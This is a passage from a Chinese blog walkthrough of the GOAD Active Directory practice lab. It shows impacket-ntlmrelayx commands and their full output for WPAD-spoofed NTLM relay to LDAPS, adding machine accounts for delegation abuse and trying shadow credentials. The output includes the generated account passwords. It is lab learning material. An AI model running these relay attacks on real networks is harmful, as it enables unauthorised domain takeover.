class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br><br></code></pre></td></tr></table></figure>

<p>这里用萝卜的权限是没办法创建用户的。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-ntlmrelayx <span class="hljs-number">-6</span> -wh wpadfakeserver.essos.<span class="hljs-keyword">local</span> -t ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> <span class="hljs-comment">--add-computer relayedpc --delegate-access --no-validate-privs</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client WINRMS loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client SMTP loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode <span class="hljs-keyword">to</span> single host<br>[*] Setting up SMB <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">445</span><br>[*] Setting up HTTP <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span><br>[*] Setting up WCF <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">9389</span><br>[*] Setting up RAW <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">6666</span><br>[*] Setting up WinRM (HTTP) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5985</span><br>[*] Setting up WinRMS (HTTPS) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5986</span><br>[*] Setting up RPC <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">135</span><br>[*] Multirelay disabled<br><br>[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: /wpad.dat<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> ESSOS/BRAAVOS$@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">1</span>]<br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Attempting <span class="hljs-keyword">to</span> <span class="hljs-keyword">create</span> computer <span class="hljs-keyword">in</span>: CN=Computers,DC=essos,DC=<span class="hljs-keyword">local</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Adding <span class="hljs-built_in">new</span> computer <span class="hljs-keyword">with</span> username: relayedpc$ <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>: &#123;J.JOd4NC$(<span class="hljs-number">0</span>$d# result: OK<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-built_in">New</span> computer already added. Refusing <span class="hljs-keyword">to</span> <span class="hljs-keyword">add</span> another<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-keyword">User</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> LDAP: <span class="hljs-keyword">False</span><br><br></code></pre></td></tr></table></figure>

<p>成功创建了用户</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: /wpad.dat<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> ESSOS/BRAAVOS$@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">1</span>]<br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Attempting <span class="hljs-keyword">to</span> <span class="hljs-keyword">create</span> computer <span class="hljs-keyword">in</span>: CN=Computers,DC=essos,DC=<span class="hljs-keyword">local</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Adding <span class="hljs-built_in">new</span> computer <span class="hljs-keyword">with</span> username: relayedpc$ <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>: &#123;J.JOd4NC$(<span class="hljs-number">0</span>$d# result: OK<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-built_in">New</span> computer already added. Refusing <span class="hljs-keyword">to</span> <span class="hljs-keyword">add</span> another<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-keyword">User</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> LDAP: <span class="hljs-keyword">False</span><br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-keyword">User</span> <span class="hljs-keyword">to</span> escalate does <span class="hljs-keyword">not</span> exist!<br></code></pre></td></tr></table></figure>

<p>但是RBCD的流程还没走完就断了，很烦。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-ntlmrelayx <span class="hljs-number">-6</span> -wh wpadfakeserver.essos.<span class="hljs-keyword">local</span> -t ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> <span class="hljs-comment">--add-computer relayedpc2 --delegate-access --no-validate-privs</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client WINRMS loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client SMTP loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode <span class="hljs-keyword">to</span> single host<br>[*] Setting up SMB <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">445</span><br>[*] Setting up HTTP <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span><br>[*] Setting up WCF <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">9389</span><br>[*] Setting up RAW <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">6666</span><br>[*] Setting up WinRM (HTTP) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5985</span><br>[*] Setting up WinRMS (HTTPS) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5986</span><br>[*] Setting up RPC <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">135</span><br>[*] Multirelay disabled<br><br>[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> ESSOS/BRAAVOS$@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">1</span>]<br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Attempting <span class="hljs-keyword">to</span> <span class="hljs-keyword">create</span> computer <span class="hljs-keyword">in</span>: CN=Computers,DC=essos,DC=<span class="hljs-keyword">local</span><br>[*] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Adding <span class="hljs-built_in">new</span> computer <span class="hljs-keyword">with</span> username: relayedpc2$ <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>: *EbQ-MgOy_,ARuA result: OK<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-built_in">New</span> computer already added. Refusing <span class="hljs-keyword">to</span> <span class="hljs-keyword">add</span> another<br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-keyword">User</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> LDAP: <span class="hljs-keyword">False</span><br>[-] ldaps://ESSOS/BRAAVOS$@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; <span class="hljs-keyword">User</span> <span class="hljs-keyword">to</span> escalate does <span class="hljs-keyword">not</span> exist!<br>[*] (HTTP): Client requested <span class="hljs-type">path</span>: /wpad.dat<br><br></code></pre></td></tr></table></figure>

<p>这就挺烦的改了名字还不行</p>
<p>尝试影子凭证。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-ntlmrelayx <span class="hljs-number">-6</span> -wh wpadfakeserver.essos.<span class="hljs-keyword">local</span> -t ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> <span class="hljs-comment">--add-computer relayedpc3 --shadow-credentials --no-validate-privs</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client WINRMS loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client SMTP loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode <span class="hljs-keyword">to</span> single host<br>[*] Setting up SMB <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">445</span><br>[*] Setting up HTTP <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span><br>[*] Setting up WCF <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">9389</span><br>[*] Setting up RAW <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">6666</span><br>[*] Setting up WinRM (HTTP) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5985</span><br>[*] Setting up WinRMS (HTTPS) <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">5986</span><br>[*] Setting up RPC <span class="hljs-keyword">Server</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">135</span><br>[*] Multirelay disabled<br><br>[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] (HTTP): <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">from</span> ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> controlled, attacking target ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span><br>[*] (HTTP): Authenticating <span class="hljs-keyword">connection</span> <span class="hljs-keyword">from</span> /@::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> against ldaps://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> SUCCEED [<span class="hljs-number">1</span>]<br>[*] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Assuming relayed <span class="hljs-keyword">user</span> has <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> escalate a <span class="hljs-keyword">user</span> via ACL attack<br>[-] ldaps:///@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span> [<span class="hljs-number">1</span>] -&gt; Cannot <span class="hljs-keyword">perform</span> ACL escalation because we <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have <span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">privileges</span>. Specify a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> assign <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--escalate-user</span><br><span class="hljs-keyword">Exception</span> <span class="hljs-keyword">in</span> thread Thread<span class="hljs-number">-10</span>:<br><br></code></pre></td></tr></table></figure>

<p>还是不太行，借用一下wp的图吧</p>
<p><img src="/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/remove_mic.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/rbcd_after_remove_mic.png" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/GOAD/" class="print-no-link">#GOAD</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>从零开始的GOAD生活(上)</div>
      <div>http://example.com/2026/02/01/从零开始的GOAD生活-上/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>Skyarrow</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>February 1, 2026</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2026/02/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%AD/" title="从零开始的GOAD生活(中)">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">从零开始的GOAD生活(中)</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/" title="从零开始的windows生活-EscapeTwo">
                        <span class="hidden-mobile">从零开始的windows生活-EscapeTwo</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <style>.statistics { display: none !important; }</style>
<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
<br>
<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
    </div>
  
  
  
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
